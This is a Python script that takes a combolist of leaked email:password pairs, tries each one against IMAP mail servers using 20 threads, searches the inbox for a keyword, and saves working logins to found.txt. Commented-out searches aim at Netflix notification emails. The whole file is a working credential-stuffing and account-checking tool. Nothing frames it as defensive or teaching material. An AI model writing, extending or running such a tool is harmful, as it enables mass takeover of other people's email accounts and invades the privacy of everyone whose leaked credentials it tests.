import imaplib
import json
import argparse
import threading
import queue
from termcolor import colored
import random



# Number of threads
NUM_WORKERS = 20

def load_config():
    with open('config.json', 'r') as file:
        return json.load(file)

def find_server_settings(email, config):
    domain = email.split('@')[-1]
    for provider in config:
        if domain in provider["Domains"]:
            return provider
    return None

def check_email(email, password, keyword, server_settings, output_queue):
    try:
        mail = imaplib.IMAP4_SSL(server_settings['Hostname'], server_settings['Port'], timeout=10)
        mail.login(email, password)
        # print(colored(f"Connection established with {email}", 'green'))
        mail.select('inbox')
        result, data = mail.search(None, f'(BODY "{keyword}" SINCE "01-Jan-2024")')
        # result, data = mail.search(None, '(FROM "info@mailer.netflix.com" BODY "New sign-in to Netflix")')
        # result, data = mail.search(None, '(FROM "info@mailer.netflix.com") SUBJECT "Top suggestions for"')
        # result, data = mail.search(None, '(SUBJECT "just added a film you might like")')
        # result, data = mail.search(None, '(FROM "info@mailer.netflix.com" SINCE "01-Jan-2024")')
        mail.logout()
        if data[0]:
            print(colored(f"Hit " + email + ":" + password, 'green'))
            output_queue.put(f"{email}:{password}")
    except Exception as e:
        # print(colored(f"Error with {email}: {e}", 'red'))
        pass


def worker(task_queue, output_queue, config, keyword):
    while True:
        email, password = task_queue.get()
        settings = find_server_settings(email, config)
        if settings:
            check_email(email, password, keyword, settings, output_queue)
        task_queue.task_done()

def process_combolist(combolist_file, keyword):
    config = load_config()
    task_queue = queue.Queue()
    output_queue = queue.Queue()

    # Start worker threads
    for _ in range(NUM_WORKERS):
        thread = threading.Thread(target=worker, args=(task_queue, output_queue, config, keyword))
        thread.daemon = True
        thread.start()

    # Enqueue tasks
    with open(combolist_file, 'r') as file:
        for line in file:
            if ':' in line:  # Check if the line contains a colon
                try:
                    email, password = line.strip().split(':')
                    task_queue.put((email, password))
                except ValueError:
                    print(f"Skipping malformed line: {line.strip()}")
            else:
                print(f"Skipping incomplete line: {line.strip()}")

    # Wait for all tasks to be processed
    task_queue.join()

    # Save found emails and passwords
    with open('found.txt', 'a') as f:
        while not output_queue.empty():
            f.write(output_queue.get() + '\n')


def main():
    parser = argparse.ArgumentParser(description="Search emails for a specific keyword.")
    parser.add_argument("combolist", help="Path to the combolist file")
    parser.add_argument("keyword", help="Keyword to search in the email")
    args = parser.parse_args()

    # Read the combolist into a list
    with open(args.combolist, 'r') as f:
        combolist = f.readlines()

    # Shuffle the combolist
    random.shuffle(combolist)

    # Write the shuffled combolist back to the file
    with open(args.combolist, 'w') as f:
        f.writelines(combolist)

    process_combolist(args.combolist, args.keyword)

if __name__ == "__main__":
    main()